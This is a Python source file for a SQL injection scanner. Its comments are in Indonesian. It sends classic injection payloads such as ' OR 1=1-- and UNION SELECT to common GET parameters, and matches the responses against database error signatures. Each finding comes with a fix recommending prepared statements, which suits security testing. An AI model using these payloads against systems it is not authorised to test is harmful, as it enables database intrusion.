"""
sqli.py — SQL Injection Scanner
Returns list of findings dengan detail: URL, parameter, payload, error signature.
"""
import requests
import warnings
warnings.filterwarnings("ignore")

PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "' OR '1'='1'--",
    "' AND 1=2 UNION SELECT NULL--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 100--",
]

PARAMS = ["id", "user", "username", "uid", "pid", "cat", "category", "item",
          "product", "page", "num", "q", "search", "order", "sort"]

# Error signatures dari berbagai database engine
ERROR_SIGNATURES = [
    ("sql syntax",                      "MySQL syntax error"),
    ("mysql_fetch",                     "MySQL fetch error exposed"),
    ("mysql_num_rows",                  "MySQL function exposed"),
    ("mysql error",                     "MySQL error exposed"),
    ("you have an error in your sql",   "MySQL query error"),
    ("warning: mysql",                  "MySQL warning exposed"),
    ("unclosed quotation",              "MSSQL unclosed quote"),
    ("quoted string not properly terminated", "Oracle/MSSQL quote error"),
    ("sqlstate",                        "SQLSTATE error exposed"),
    ("ora-01756",                       "Oracle SQL error"),
    ("ora-00907",                       "Oracle missing parenthesis"),
    ("microsoft jet database",          "MS Access error"),
    ("odbc microsoft access",           "ODBC Access error"),
    ("sqlite_step",                     "SQLite error exposed"),
    ("pg_exec",                         "PostgreSQL exec error"),
    ("pg::syntaxerror",                 "PostgreSQL syntax error"),
    ("division by zero",                "SQL division by zero"),
    ("microsoft sql native client",     "MSSQL native error"),
    ("postgresql error",                "PostgreSQL error exposed"),
    ("[microsoft][odbc",                "ODBC MSSQL error"),
    ("syntax error in query expression","MS Access query error"),
    ("supplied argument is not a valid mysql", "MySQL invalid argument"),
]

HEADERS = {"User-Agent": "NightProbe-Scanner/1.0"}


def scan_sqli(url: str, timeout: int = 6) -> dict:
    """
    Test SQL injection via GET params.

    Returns:
        {
          "vulnerable": True/False,
          "findings": [
            {
              "url":       "https://target.com?id='%20OR%201%3D1--",
              "param":     "id",
              "payload":   "' OR 1=1--",
              "error":     "MySQL syntax error",
              "fix":       "Gunakan prepared statement / parameterized query untuk param 'id'."
            },
            ...
          ]
        }
    """
    base = url.rstrip("/")
    findings = []
    seen = set()  # Hindari duplikat param yang sama

    for param in PARAMS:
        for payload in PAYLOADS:
            if param in seen:
                break  # Satu finding per param sudah cukup
            try:
                test_url = f"{base}?{param}={requests.utils.quote(payload)}"
                r = requests.get(
                    test_url, timeout=timeout, headers=HEADERS,
                    allow_redirects=True, verify=False
                )
                body_lower = r.text.lower()

                for sig_text, sig_label in ERROR_SIGNATURES:
                    if sig_text in body_lower:
                        findings.append({
                            "url":     test_url,
                            "param":   param,
                            "payload": payload,
                            "error":   sig_label,
                            "fix": (
                                f"Parameter '{param}' rentan terhadap SQL Injection. "
                                f"Gunakan Prepared Statement / Parameterized Query. "
                                f"Jangan pernah menggabungkan input user langsung ke query SQL."
                            ),
                        })
                        seen.add(param)
                        break

            except requests.exceptions.RequestException:
                continue

    return {
        "vulnerable": len(findings) > 0,
        "findings":   findings,
    }
